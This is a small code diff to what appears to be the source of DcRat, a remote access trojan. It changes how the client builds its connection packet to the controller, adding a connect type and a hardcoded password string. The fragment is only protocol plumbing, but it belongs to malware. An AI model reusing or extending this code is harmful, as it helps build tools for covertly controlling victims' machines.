@@ -281,8 +281,9 @@ namespace DcRat.TCPSocket
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Controler";
+            msgpack.ForcePathObject("Type").AsString = "Connect";
+            msgpack.ForcePathObject("Password").AsString = "qwqdanchun";
             msgpack.ForcePathObject("HWID").AsString = HWID();
-            //msgpack.ForcePathObject("Password").AsString = HWID();
             return msgpack.Encode2Bytes();
         }
 
